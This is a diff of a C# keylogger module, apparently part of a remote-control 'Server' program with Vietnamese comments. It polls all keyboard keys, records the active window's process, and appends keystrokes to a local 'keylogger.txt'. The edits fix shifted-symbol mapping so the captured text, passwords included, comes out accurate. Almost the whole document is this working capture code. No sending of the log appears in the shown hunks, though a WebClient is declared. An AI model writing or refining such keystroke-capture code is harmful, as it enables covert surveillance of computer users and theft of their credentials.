@@ -20,8 +20,6 @@ namespace Server
     {
         #region Key board
         static WebClient webclient = Program.webClient;
-        //private static string logName = "Log_";
-        //private static string logExtendtion = ".txt";
         static string pathKeylogger = "keylogger.txt";
         static bool isStarted = false;
         private static DateTime timeStart;
@@ -32,7 +30,6 @@ namespace Server
         static extern IntPtr GetForegroundWindow();
         [DllImport("user32.dll", SetLastError = true)]
         static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
-
         static string activeProcessName = GetActiveWindowProcessName().ToLower();
         static string prevProcessName = activeProcessName;
         static Thread th_doKeylogger;
@@ -41,15 +38,14 @@ namespace Server
         {
             isStarted = true;
             th_doKeylogger = new Thread(new ThreadStart(DoKeylogger));
-            th_doKeylogger.SetApartmentState(ApartmentState.STA);
+            th_doKeylogger.SetApartmentState(ApartmentState.STA); // Tất cả các tác vụ trên các đối tượng COM phải được thực hiện trên một luồng duy nhất
             th_doKeylogger.Start();
             Console.WriteLine("Start keylogger");
-
         }
         public static void StartKeylogger()
         {
             isStarted = true;
-            using (StreamWriter writer = new StreamWriter(pathKeylogger, false)) 
+            using (StreamWriter writer = new StreamWriter(pathKeylogger, false)) // false: ghi từ đầu, true: ghi tiếp
             {
             }
             Console.WriteLine("Keylogger started.");
@@ -105,14 +101,14 @@ namespace Server
             {
                 if (!isStarted) continue;
                 string keyPressed = GetNewPressedKeys();
-                if(!System.IO.File.Exists("keylogger.txt"))
+                if (!System.IO.File.Exists("keylogger.txt"))
                 {
                     using (FileStream fs = File.Create("keylogger.txt"))
                     {
                         Console.WriteLine("Tao keylogger.txt");
                     }
-                }    
-                
+                }
+
                 if (!IsFileInUse(pathKeylogger))
                 {
                     using (StreamWriter sw = new StreamWriter(pathKeylogger, true))
@@ -149,7 +145,6 @@ namespace Server
         private static string GetNewPressedKeys()
         {
             string pressedKey = String.Empty;
-
             foreach (int i in Enum.GetValues(typeof(Key)))
             {
                 Key key = (Key)Enum.Parse(typeof(Key), i.ToString());
@@ -163,8 +158,7 @@ namespace Server
                     PressedKeysHistory.Remove(key);
                 else if (down && !PressedKeysHistory.Contains(key)) //If the key is pressed, but wasn't pressed before - save it
                 {
-
-                    if (!isCaps())
+                    if (!isCapOrShift())
                     {
                         PressedKeysHistory.Add(key);
                         pressedKey = key.ToString().ToLower(); //by default it is CAPS
@@ -174,36 +168,37 @@ namespace Server
                         PressedKeysHistory.Add(key);
                         pressedKey = key.ToString(); //CAPS
                     }
-
                 }
             }
-            return replaceStrings(pressedKey,isCaps());
+            return replaceStrings(pressedKey, isCapOrShift());
         }
-        private static string replaceStrings(string input,bool cap)
+        private static string replaceStrings(string input, bool cap)
         {
             string replacedKey = input;
-            if(!input.Trim().Equals(""))
-            {
-                Console.WriteLine(input);
-            }  
-            
-            if(input.Equals("space") || input.Equals("Space"))
+            bool isShift = (Keyboard.Modifiers & ModifierKeys.Shift) == ModifierKeys.Shift;
+            //Console.WriteLine(cap);
+            //if (!input.Trim().Equals(""))
+            //{
+            //    Console.WriteLine(input);
+            //}
+
+            if (input.Equals("space") || input.Equals("Space"))
             {
                 replacedKey = " ";
-            } 
-            else if(input.Equals("return") || input.Equals("Return"))
-            {
-                replacedKey = "\r\n";
             }
-            else if (input.Equals("escape")|| input.Equals("Escape"))
+            else if (input.Equals("return") || input.Equals("Return"))
+            {
+                replacedKey = "[ENTER]";
+            }
+            else if (input.Equals("escape") || input.Equals("Escape"))
             {
                 replacedKey = "[ESC]";
             }
-            else if (input.Equals("RightShift") || input.Equals("LeftShift"))
+            else if (input.Equals("RightShift") || input.Equals("LeftShift") || input.Equals("rightShift") || input.Equals("RightShift"))
             {
                 replacedKey = "[SHIFT]";
             }
-            else if (input.Equals("leftctrl") || input.Equals("LeftCtrl")|| input.Equals("rightctrl") || input.Equals("RightCtrl"))
+            else if (input.Equals("leftctrl") || input.Equals("LeftCtrl") || input.Equals("rightctrl") || input.Equals("RightCtrl"))
             {
                 replacedKey = "[CTRL]";
             }
@@ -225,7 +220,7 @@ namespace Server
             }
             else if (input.Equals("capital") || input.Equals("Capital"))
             {
-                replacedKey = "";
+                replacedKey = "[CAPLOCK]";
             }
             else if (input.Equals("oemcomma"))
             {
@@ -233,13 +228,13 @@ namespace Server
             }
             else if (input.Equals("OemComma"))
             {
-                if(cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = ",";
+                    replacedKey = "<";
                 }
                 else
                 {
-                    replacedKey = "<";
+                    replacedKey = ",";
                 }
             }
             else if (input.Equals("oemperiod"))
@@ -248,13 +243,13 @@ namespace Server
             }
             else if (input.Equals("OemPeriod"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = ".";
+                    replacedKey = ">";
                 }
                 else
                 {
-                    replacedKey = ">";
+                    replacedKey = ".";
                 }
             }
             else if (input.Equals("oemquestion"))
@@ -263,13 +258,13 @@ namespace Server
             }
             else if (input.Equals("OemQuestion"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "/";
+                    replacedKey = "?";
                 }
                 else
                 {
-                    replacedKey = "?";
+                    replacedKey = "/";
                 }
             }
             else if (input.Equals("oem1"))
@@ -278,13 +273,13 @@ namespace Server
             }
             else if (input.Equals("Oem1"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = ";";
+                    replacedKey = ":";
                 }
                 else
                 {
-                    replacedKey = ":";
+                    replacedKey = ";";
                 }
             }
             else if (input.Equals("oemquotes"))
@@ -293,28 +288,28 @@ namespace Server
             }
             else if (input.Equals("OemQuotes"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "'";
+                    replacedKey = "\"";
                 }
                 else
                 {
-                    replacedKey = "\"";
+                    replacedKey = "'";
                 }
             }
             else if (input.Equals("oemopenbrackets"))
             {
-                replacedKey = "["; 
+                replacedKey = "[";
             }
             else if (input.Equals("OemOpenBrackets"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "[";
+                    replacedKey = "{";
                 }
                 else
                 {
-                    replacedKey = "{";
+                    replacedKey = "[";
                 }
             }
             else if (input.Equals("oem6"))
@@ -323,13 +318,13 @@ namespace Server
             }
             else if (input.Equals("Oem6"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "]";
+                    replacedKey = "}";
                 }
                 else
                 {
-                    replacedKey = "}";
+                    replacedKey = "]";
                 }
             }
             else if (input.Equals("d1"))
@@ -338,13 +333,13 @@ namespace Server
             }
             else if (input.Equals("D1"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "1";
+                    replacedKey = "!";
                 }
                 else
                 {
-                    replacedKey = "!";
+                    replacedKey = "1";
                 }
             }
             else if (input.Equals("d2"))
@@ -353,13 +348,13 @@ namespace Server
             }
             else if (input.Equals("D2"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "2";
+                    replacedKey = "@";
                 }
                 else
                 {
-                    replacedKey = "@";
+                    replacedKey = "2";
                 }
             }
             else if (input.Equals("d3"))
@@ -368,13 +363,13 @@ namespace Server
             }
             else if (input.Equals("D3"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "3";
+                    replacedKey = "#";
                 }
                 else
                 {
-                    replacedKey = "#";
+                    replacedKey = "3";
                 }
             }
             else if (input.Equals("d4"))
@@ -383,13 +378,13 @@ namespace Server
             }
             else if (input.Equals("D4"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "4";
+                    replacedKey = "$";
                 }
                 else
                 {
-                    replacedKey = "$";
+                    replacedKey = "4";
                 }
             }
             else if (input.Equals("d5"))
@@ -398,13 +393,13 @@ namespace Server
             }
             else if (input.Equals("D5"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "5";
+                    replacedKey = "%";
                 }
                 else
                 {
-                    replacedKey = "%";
+                    replacedKey = "5";
                 }
             }
             else if (input.Equals("d6"))
@@ -413,13 +408,13 @@ namespace Server
             }
             else if (input.Equals("D6"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "6";
+                    replacedKey = "^";
                 }
                 else
                 {
-                    replacedKey = "^";
+                    replacedKey = "6";
                 }
             }
             else if (input.Equals("d7"))
@@ -428,13 +423,13 @@ namespace Server
             }
             else if (input.Equals("D7"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "7";
+                    replacedKey = "&";
                 }
                 else
                 {
-                    replacedKey = "&";
+                    replacedKey = "7";
                 }
             }
             else if (input.Equals("d8"))
@@ -443,13 +438,13 @@ namespace Server
             }
             else if (input.Equals("D8"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "8";
+                    replacedKey = "*";
                 }
                 else
                 {
-                    replacedKey = "*";
+                    replacedKey = "8";
                 }
             }
             else if (input.Equals("d9"))
@@ -458,13 +453,13 @@ namespace Server
             }
             else if (input.Equals("D9"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "9";
+                    replacedKey = "(";
                 }
                 else
                 {
-                    replacedKey = "(";
+                    replacedKey = "9";
                 }
             }
             else if (input.Equals("d0"))
@@ -473,13 +468,13 @@ namespace Server
             }
             else if (input.Equals("D0"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "0";
+                    replacedKey = ")";
                 }
                 else
                 {
-                    replacedKey = ")";
+                    replacedKey = "0";
                 }
             }
             else if (input.Equals("oemminus"))
@@ -488,13 +483,13 @@ namespace Server
             }
             else if (input.Equals("OemMinus"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "-";
+                    replacedKey = "_";
                 }
                 else
                 {
-                    replacedKey = "_";
+                    replacedKey = "-";
                 }
             }
             else if (input.Equals("oemplus"))
@@ -503,13 +498,28 @@ namespace Server
             }
             else if (input.Equals("OemPlus"))
             {
-                if (cap == true)
+                if (isShift == true)
                 {
-                    replacedKey = "=";
+                    replacedKey = "+";
                 }
                 else
                 {
-                    replacedKey = "+";
+                    replacedKey = "=";
+                }
+            }
+            else if (input.Equals("oem3"))
+            {
+                replacedKey = "`";
+            }
+            else if (input.Equals("Oem3"))
+            {
+                if (isShift == true)
+                {
+                    replacedKey = "~";
+                }
+                else
+                {
+                    replacedKey = "`";
                 }
             }
             else if (input.Equals("oem5"))
@@ -518,22 +528,18 @@ namespace Server
             }
             else if (input.Equals("Oem5"))
             {
-                if (cap == true)
-                {
-                    replacedKey = "\\";
-                }
-                else
+                if (isShift == true)
                 {
                     replacedKey = "|";
                 }
+                else
+                {
+                    replacedKey = "\\";
+                }
             }
-            else if (input.Equals("delete")|| input.Equals("Delete"))
+            else if (input.Equals("delete") || input.Equals("Delete"))
             {
                 replacedKey = "[DELETE]";
-            }
-            else if (input.Equals("divide") || input.Equals("Divide"))
-            {
-                replacedKey = "/";
             }
             else if (input.Equals("divide") || input.Equals("Divide"))
             {
@@ -599,14 +605,20 @@ namespace Server
             {
 
             };
+
+            if(!replacedKey.Trim().Equals(""))
+            {
+                Console.WriteLine(replacedKey);
+            }    
+
             return replacedKey;
         }
 
-        private static bool isCaps()
+        private static bool isCapOrShift()
         {
-            bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
-            bool isShiftKeyPressed = (Keyboard.Modifiers & ModifierKeys.Shift) == ModifierKeys.Shift;
-            if (isCapsLockOn || isShiftKeyPressed) return true;
+            bool isCap = Control.IsKeyLocked(Keys.CapsLock);
+            bool isShift = (Keyboard.Modifiers & ModifierKeys.Shift) == ModifierKeys.Shift;
+            if (isCap || isShift) return true;
             else return false;
         }
 
